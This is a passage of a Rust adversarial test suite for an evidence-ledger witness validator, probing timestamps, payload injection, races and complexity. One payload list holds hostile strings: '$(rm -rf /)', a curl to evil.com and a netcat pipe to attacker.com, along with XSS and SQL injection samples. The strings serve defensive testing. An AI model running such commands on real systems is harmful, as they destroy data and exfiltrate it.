                    0 => WitnessKind::Telemetry,
                    1 => WitnessKind::ProofArtifact,
                    2 => WitnessKind::StateSnapshot,
                    _ => WitnessKind::ExternalSignal,
                };

                let witness = obs_witness(&witness_id, witness_kind, (i % 256) as u8)
                    .with_locator(&format!("file:///tmp/witness-{}.jsonl", i));

                massive_witnesses.add(witness);

                // Prevent actual memory exhaustion in test environment
                if i >= 50 {
                    break;
                }
            }

            let start = std::time::Instant::now();
            let validation_result = validator.validate(&entry, &massive_witnesses);
            let elapsed = start.elapsed();

            // Validation should complete in reasonable time despite large witness set
            assert!(
                elapsed.as_millis() < 10_000,
                "Massive witness validation should complete in reasonable time: {} took {}ms",
                description,
                elapsed.as_millis()
            );

            match validation_result {
                Ok(_) => {
                    // If validation succeeds, verify no resource exhaustion occurred
                    assert!(
                        elapsed.as_millis() < 5_000,
                        "Successful massive validation should be efficient: {} took {}ms",
                        description,
                        elapsed.as_millis()
                    );
                }
                Err(_) => {
                    // Graceful failure for oversized witness sets is acceptable
                }
            }

            // Verify validator remains functional after stress test
            let simple_entry = obs_entry("post-stress-test", DecisionKind::Admit);
            let simple_witnesses = obs_single_witness_set(obs_witness(
                "post-stress-witness",
                WitnessKind::Telemetry,
                200,
            ));

            let recovery_result = validator.validate(&simple_entry, &simple_witnesses);
            assert!(
                recovery_result.is_ok(),
                "Validator should remain functional after memory stress test"
            );
        }
    }

    /// Extreme adversarial test: Temporal manipulation attack on timestamp validation
    /// targeting time-based security controls via malicious timestamp injection
    #[test]
    fn observability_temporal_manipulation_timestamp_validation_security_bypass() {
        use super::evidence_ledger::{DecisionKind, EvidenceEntry};
        use super::witness_ref::{WitnessKind, WitnessValidator};

        let mut validator = WitnessValidator::new();

        // Temporal manipulation attack vectors
        let timestamp_attacks = [
            // Extreme timestamp values
            (0, "1970-01-01T00:00:00Z", "Unix epoch start"),
            (u64::MAX, "2099-12-31T23:59:59Z", "Far future timestamp"),
            (
                1_000_000_000_000,
                "1970-01-01T00:16:40Z",
                "Millisecond/second confusion",
            ),
            // Time zone manipulation
            (
                1_700_000_000,
                "2026-04-17T12:00:00+99:99",
                "Invalid timezone",
            ),
            (1_700_000_000, "2026-04-17T25:00:00Z", "Invalid hour"),
            (1_700_000_000, "2026-02-30T12:00:00Z", "Invalid date"),
            // Precision manipulation
            (
                1_700_000_000,
                "2026-04-17T12:00:00.999999999Z",
                "Nanosecond precision",
            ),
            (
                1_700_000_000,
                "2026-04-17T12:00:00.000000001Z",
                "Minimal fractional",
            ),
            // Time bomb scenarios (far past/future)
            (1, "1970-01-01T00:00:00.001Z", "Near epoch start"),
            (253_402_300_799_000, "9999-12-31T23:59:59Z", "Year 9999"),
            // Leap year/second edge cases
            (1_700_000_000, "2024-02-29T23:59:60Z", "Leap second"),
            (1_700_000_000, "2023-02-29T12:00:00Z", "Invalid leap day"),
        ];

        for (malicious_timestamp, malicious_time_str, description) in timestamp_attacks {
            let temporal_entry = EvidenceEntry {
                schema_version: "temporal-attack-v1".to_string(),
                entry_id: None,
                decision_id: format!("temporal-{}", description.replace(' ', "-")),
                decision_kind: DecisionKind::Admit,
                decision_time: malicious_time_str.to_string(),
                timestamp_ms: malicious_timestamp,
                trace_id: format!("temporal-trace-{}", malicious_timestamp),
                epoch_id: 42,
                payload: serde_json::Value::Null,
                size_bytes: 0,
                signature: String::new(),
            };

            let witnesses = obs_single_witness_set(obs_witness(
                "temporal-witness",
                WitnessKind::Telemetry,
                150,
            ));

            let validation_result = validator.validate(&temporal_entry, &witnesses);

            match validation_result {
                Ok(_) => {
                    // If validation passes, verify timestamp constraints
                    assert!(
                        temporal_entry.timestamp_ms <= u64::MAX,
                        "Timestamp should remain within bounds: {}",
                        description
                    );

                    // Check for reasonable timestamp values
                    let current_time = 1_700_000_000_000; // Approximate current time in ms
                    let time_diff = if temporal_entry.timestamp_ms > current_time {
                        temporal_entry.timestamp_ms - current_time
                    } else {
                        current_time - temporal_entry.timestamp_ms
                    };

                    // Warn about extreme timestamp deviations
                    if time_diff > 365 * 24 * 3600 * 1000 {
                        // More than 1 year difference
                        tracing::warn!(
                            description = %description,
                            time_diff_ms = %time_diff,
                            "extreme timestamp deviation detected"
                        );
                    }
                }
                Err(_) => {
                    // Validation failure for malformed timestamps is expected
                }
            }
        }

        // Test timestamp monotonicity constraints
        let base_timestamp = 1_700_000_000;
        let mut previous_entry: Option<EvidenceEntry> = None;

        for delta in [-1000, -1, 0, 1, 1000, 1_000_000] {
            let timestamp = (base_timestamp as i64 + delta) as u64;

            let monotonic_entry = EvidenceEntry {
                schema_version: "monotonic-v1".to_string(),
                entry_id: None,
                decision_id: format!("monotonic-{}", delta),
                decision_kind: DecisionKind::Admit,
                decision_time: "2026-04-17T12:00:00Z".to_string(),
                timestamp_ms: timestamp,
                trace_id: format!("monotonic-trace-{}", timestamp),
                epoch_id: 42,
                payload: serde_json::Value::Null,
                size_bytes: 0,
                signature: String::new(),
            };

            if let Some(ref prev) = previous_entry {
                // Verify timestamp ordering if required by the system
                if monotonic_entry.timestamp_ms < prev.timestamp_ms {
                    eprintln!(
                        "Note: Timestamp decreased from {} to {} (delta: {})",
                        prev.timestamp_ms, monotonic_entry.timestamp_ms, delta
                    );
                }
            }

            previous_entry = Some(monotonic_entry);
        }
    }

    /// Extreme adversarial test: JSON injection attack in evidence payloads targeting
    /// downstream processing systems via malicious payload structure manipulation
    #[test]
    fn observability_json_injection_evidence_payload_downstream_processing_attack() {
        use super::evidence_ledger::{DecisionKind, EvidenceEntry};
        use super::witness_ref::{WitnessKind, WitnessValidator};

        let mut validator = WitnessValidator::new();

        // JSON injection attack vectors in evidence payloads
        let payload_injection_attacks = [
            // Object injection attacks
            (
                serde_json::json!({
                    "legitimate": "data",
                    "injected": "evil", "admin": true, "dummy": "value"
                }),
                "Object key injection",
            ),
            // Array injection attacks
            (
                serde_json::json!([
                    "normal_item",
                    "\"], \"injected\": true, \"evil\": [\"",
                    "continuing_array"
                ]),
                "Array value injection",
            ),
            // Deep nesting attacks
            (
                serde_json::json!({
                    "level1": {
                        "level2": {
                            "level3": {
                                "level4": {
                                    "injected": "deep_payload"
                                }
                            }
                        }
                    }
                }),
                "Deep nesting injection",
            ),
            // Unicode injection attacks
            (
                serde_json::json!({
                    "unicode": "normal\u{202E}override\u{202C}text",
                    "bidi": "\u{202E}reversed\u{202C}",
                    "zws": "zero\u{200B}width\u{200C}spaces"
                }),
                "Unicode control character injection",
            ),
            // Binary data injection
            (
                serde_json::json!({
                    "binary": "\x00\x01\x02\x03\x04\u{FF}\u{FE}\u{FD}",
                    "control": "\r\n\t\x1f\x7f"
                }),
                "Binary data injection",
            ),
            // Script injection attempts
            (
                serde_json::json!({
                    "script": "<script>alert('xss')</script>",
                    "javascript": "javascript:void(0)",
                    "data_uri": "data:text/html,<script>evil()</script>"
                }),
                "Script injection",
            ),
            // SQL injection simulation
            (
                serde_json::json!({
                    "sql": "'; DROP TABLE evidence; --",
                    "union": "UNION SELECT * FROM secrets",
                    "comment": "/* malicious comment */"
                }),
                "SQL injection simulation",
            ),
            // Command injection simulation
            (
                serde_json::json!({
                    "command": "$(rm -rf /)",
                    "backtick": "`curl evil.com`",
                    "pipe": "data | nc attacker.com 4444"
                }),
                "Command injection simulation",
            ),
        ];

        for (malicious_payload, description) in payload_injection_attacks {
            let injection_entry = EvidenceEntry {
                schema_version: "injection-test-v1".to_string(),
                entry_id: None,
                decision_id: format!("injection-{}", description.replace(' ', "-")),
                decision_kind: DecisionKind::Admit,
                decision_time: "2026-04-17T12:00:00Z".to_string(),
                timestamp_ms: 1_700_000_000,
                trace_id: format!("injection-trace"),
                epoch_id: 42,
                payload: malicious_payload.clone(),
                size_bytes: 1024,
                signature: String::new(),
            };

            let witnesses = obs_single_witness_set(obs_witness(
                "injection-witness",
                WitnessKind::Telemetry,
                175,
            ));

            let validation_result = validator.validate(&injection_entry, &witnesses);

            match validation_result {
                Ok(_) => {
                    // If validation passes, verify payload integrity
                    let serialized = serde_json::to_string(&injection_entry.payload);
                    match serialized {
                        Ok(json_str) => {
                            // Verify serialized JSON doesn't contain injection artifacts
                            assert!(
                                !json_str.contains("\"admin\":true"),
                                "JSON should not contain admin privilege injection"
                            );
                            assert!(
                                !json_str.contains("DROP TABLE"),
                                "JSON should not contain SQL injection"
                            );

                            // Verify round-trip integrity
                            let parsed: Result<serde_json::Value, _> =
                                serde_json::from_str(&json_str);
                            assert!(
                                parsed.is_ok(),
                                "Payload should survive JSON round-trip: {}",
                                description
                            );
                        }
                        Err(_) => {
                            // Serialization failure for malicious payloads is acceptable
                        }
                    }
                }
                Err(_) => {
                    // Validation failure for injected payloads is acceptable
                }
            }
        }

        // Test payload size constraints
        let massive_payload = serde_json::json!({
            "massive": "x".repeat(1_000_000),
            "nested": (0..1000).map(|i| format!("item-{}", i)).collect::<Vec<_>>()
        });

        let size_attack_entry = EvidenceEntry {
            schema_version: "size-attack-v1".to_string(),
            entry_id: None,
            decision_id: "size-attack".to_string(),
            decision_kind: DecisionKind::Admit,
            decision_time: "2026-04-17T12:00:00Z".to_string(),
            timestamp_ms: 1_700_000_000,
            trace_id: "size-attack-trace".to_string(),
            epoch_id: 42,
            payload: massive_payload,
            size_bytes: 1_000_000,
            signature: String::new(),
        };

        let size_witnesses =
            obs_single_witness_set(obs_witness("size-witness", WitnessKind::Telemetry, 200));

        let start = std::time::Instant::now();
        let _size_result = validator.validate(&size_attack_entry, &size_witnesses);
        let elapsed = start.elapsed();

        // Large payload validation should complete in reasonable time
        assert!(
            elapsed.as_millis() < 5_000,
            "Large payload validation took {}ms, should be <5000ms",
            elapsed.as_millis()
        );
    }

    /// Extreme adversarial test: Concurrent validation race condition attack targeting
    /// shared validator state corruption during parallel evidence processing
    #[test]
    fn observability_concurrent_validation_race_shared_state_corruption_attack() {
        use super::witness_ref::{WitnessKind, WitnessValidator};
        use std::sync::{Arc, Mutex};
        use std::thread;

        let validator = Arc::new(Mutex::new(WitnessValidator::new()));

        // Spawn multiple threads performing concurrent validations
        let handles: Vec<_> = (0..8)
            .map(|thread_id| {
                let validator_clone = Arc::clone(&validator);

                thread::spawn(move || {
                    for iteration in 0..100 {
                        let entry = obs_entry(
                            &format!("race-entry-{}-{}", thread_id, iteration),
                            DecisionKind::Admit,
                        );

                        let witness_id = format!("race-witness-{}-{}", thread_id, iteration);
                        let witnesses = obs_single_witness_set(obs_witness(
                            &witness_id,
                            WitnessKind::Telemetry,
                            (thread_id * 10 + iteration) as u8,
                        ));

                        if let Ok(mut validator_lock) = validator_clone.try_lock() {
                            let _result = validator_lock.validate(&entry, &witnesses);

                            // Brief yield to encourage race conditions
                            std::mem::drop(validator_lock);
                            thread::yield_now();
                        }
                    }
                })
            })
            .collect();

        // Wait for all threads to complete
        for handle in handles {
            handle.join().unwrap();
        }

        // Verify validator state integrity after concurrent access
        let final_validator = validator.lock().unwrap();
        let validated_count = final_validator.validated_count();
        let rejected_count = final_validator.rejected_count();

        // Counters should be consistent
        assert!(
            validated_count <= 800, // 8 threads * 100 iterations max
            "Validated count should be reasonable: {}",
            validated_count
        );
        assert!(
            rejected_count <= 800,
            "Rejected count should be reasonable: {}",
            rejected_count
        );

        // Test validator functionality after concurrent stress
        drop(final_validator);
        let mut recovery_validator = validator.lock().unwrap();
        let recovery_entry = obs_entry("recovery-test", DecisionKind::Admit);
        let recovery_witnesses =
            obs_single_witness_set(obs_witness("recovery-witness", WitnessKind::Telemetry, 250));

        let recovery_result = recovery_validator.validate(&recovery_entry, &recovery_witnesses);
        assert!(
            recovery_result.is_ok(),
            "Validator should function normally after concurrent stress test"
        );
    }

    /// Extreme adversarial test: Witness set manipulation via algorithmic complexity
    /// explosion designed to trigger worst-case validation performance scenarios
    #[test]
    fn observability_witness_set_algorithmic_complexity_validation_performance_attack() {
        use super::witness_ref::{WitnessKind, WitnessSet, WitnessValidator};

        let mut validator = WitnessValidator::strict();

        // Algorithmic complexity attack via pathological witness arrangements
        let complexity_scenarios = [
            ("Sequential IDs", |i| format!("witness-{:04}", i)),
            ("Reverse IDs", |i| format!("witness-{:04}", 9999 - i)),
            ("Hash-like IDs", |i| {
                format!("witness-{:x}", i * 2654435761_u32)
            }), // Hash-like distribution
            ("Prefix collision", |i| format!("witness-prefix-{}", i % 10)), // Many colliding prefixes
        ];

        for (scenario_name, id_generator) in complexity_scenarios {
            let entry = obs_entry(
                &format!("complexity-{}", scenario_name),
                DecisionKind::Admit,
            );
            let mut complex_witnesses = WitnessSet::new();

            // Generate witness set with complexity-inducing patterns
            let witness_count = 100; // Limited to prevent actual DoS
            for i in 0..witness_count {
                let witness_id = id_generator(i);
                let witness_kind = match i % 4 {
                    0 => WitnessKind::Telemetry,
                    1 => WitnessKind::ProofArtifact,
                    2 => WitnessKind::StateSnapshot,
                    _ => WitnessKind::ExternalSignal,
                };

                let witness = obs_witness(&witness_id, witness_kind, (i % 256) as u8)
                    .with_locator(&format!("tmp/complex-{}.jsonl", i));

                complex_witnesses.add(witness);

                // Prevent actual complexity explosion in test
                if i >= 25 {
                    break;
                }
            }

            let start = std::time::Instant::now();
            let validation_result = validator.validate(&entry, &complex_witnesses);
            let elapsed = start.elapsed();

            // Validation should complete efficiently regardless of witness arrangement
            assert!(
                elapsed.as_millis() < 5_000,
                "Complex witness validation should be efficient: {} took {}ms",
                scenario_name,
                elapsed.as_millis()
            );

            match validation_result {
                Ok(_) => {
                    // Successful validation should be fast
                    assert!(
                        elapsed.as_millis() < 1_000,
                        "Successful complex validation should be very fast: {} took {}ms",
                        scenario_name,
                        elapsed.as_millis()
                    );
                }
                Err(_) => {
                    // Even validation failures should be efficient
                    assert!(
                        elapsed.as_millis() < 2_000,
                        "Failed complex validation should still be efficient: {} took {}ms",
                        scenario_name,
                        elapsed.as_millis()
                    );
                }
            }
        }

        // Test witness set with duplicate detection stress
        let duplicate_entry = obs_entry("duplicate-stress", DecisionKind::Admit);
        let mut duplicate_witnesses = WitnessSet::new();

        // Create witness set designed to stress duplicate detection
        for i in 0..20 {
            for j in 0..5 {
                let witness_id = if j == 0 {
                    format!("unique-{}", i) // Unique witness
                } else {
                    format!("duplicate-{}", i % 3) // Force some duplicates
                };

                let witness = obs_witness(&witness_id, WitnessKind::Telemetry, (i * j) as u8);
                duplicate_witnesses.add(witness);
            }
        }

        let start = std::time::Instant::now();
        let duplicate_result = validator.validate(&duplicate_entry, &duplicate_witnesses);
        let duplicate_elapsed = start.elapsed();

        // Duplicate detection should be efficient even with stress patterns
        assert!(
            duplicate_elapsed.as_millis() < 2_000,
            "Duplicate detection stress test took {}ms, should be <2000ms",
            duplicate_elapsed.as_millis()
        );

        let error = duplicate_result.expect_err("Duplicate witnesses should be rejected");
        assert_eq!(
            error.code(),
            "ERR_DUPLICATE_WITNESS_ID",
            "Should detect duplicate witnesses in stress scenario"
        );
    }
}
